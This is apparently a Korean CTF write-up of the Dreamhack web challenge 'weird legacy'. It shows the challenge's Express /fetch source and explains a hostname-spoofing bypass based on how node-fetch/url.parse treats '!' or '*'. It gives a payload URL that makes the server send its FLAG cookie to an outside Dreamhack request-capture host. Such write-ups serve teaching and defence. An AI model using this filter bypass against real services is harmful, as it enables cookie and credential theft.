---
title: (48) Dreamhack weird legacy 문제 풀이
date: 2024-03-14 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
산타할아버지가 작년에 빌었던 선물을 이제서야 주셨는데 상태가 `legacy(유산)`이네요.

## 문제 풀이
먼저 사이트에 들어오면 이런 페이지가 있습니다.
![](https://kyuyeop.github.io/assets/img/post/48/1.png)

여기선 건질게 없으니 바로 코드를 확인해 봅시다.
```javascript
const express = require("express");
const node_fetch = require("node-fetch");
const app = express();
const PORT = 3000;
const FLAG = "DH{dummy}";

app.get("/", async (req, res) => {
  res.sendFile(__dirname + "/views/index.html");
});

app.get("/fetch", async (req, res) => {
  const url = req.query.url;

  if (!url) return res.send("?url=<br>ex) http://localhost:3000/");

  let host;
  try {
    const urlObject = new URL(url);
    host = urlObject.hostname;

    if (host !== "localhost" && !host.endsWith("localhost")) return res.send("rejected");
  } catch (error) {
    return res.send("Invalid Url");
  }

  try {
    let result = await node_fetch(url, {
      method: "GET",
      headers: { "Cookie": `FLAG=${FLAG}` },
    });
    const data = await result.text();
    res.send(data);
  } catch {
    return res.send("Request Failed");
  }
});

app.listen(PORT, () => {
  console.log(`Server Running on ${PORT}`);
});
```
역시 `/fetch`페이지가 추가로 존재했습니다. 페이지는 url을 받고 간단한 검증(`host !== "localhost" && !host.endsWith("localhost")`)을 거쳐서 `rejected`를 반환하거나 아래의 코드를 실행합니다.  
그런데 여기서도 딱히 문제가 있는걸 확인하긴 어렵습니다. 그래서 구글링을 좀 해봤는데 토스에서 [Node.js url.parse() 취약점 컨트리뷰션](https://toss.tech/article/nodejs-security-contribution)라는 글을 발견했습니다.  
내용을 간단히 요약하면 hostname을 구할 때 host에서 사용할 수 없는 문자 이전까지만 잘라서 반환하도록 구현되어 있는데 `WHATWG URL API`와 `url.parse()`간의 결과 차이를 이용해 hostname spoofing이 가능하다고 합니다.  

혹시 이건가? 싶어서 적용해 보았습니다. 방법도 간단히 `!`나 `*`을 이용해서 localhost를 이어 써주기만 하면 됩니다.  
문제에서 `host`를 검사할 때 `&&`을 쓰고 있어서 둘 중 하나라도 참을 만들면 우회가 가능합니다. 이번에도 드림핵 툴즈를 사용했습니다.
`/fetch?url=https://nqxuntb.request.dreamhack.games!localhost`(`*`를 사용해도 됨)로 접속을 해보니
![](https://kyuyeop.github.io/assets/img/post/48/2.png)

이렇게 아이피가 뜨고, 드림핵 툴즈 화면으로 돌아가 보면
![](https://kyuyeop.github.io/assets/img/post/48/3.png)

쿠키에 flag가 포함되어 요청이 들어옵니다.  
  
참고로 위 취약점은 최신 버전에서는 패치되었습니다.
{% endraw %}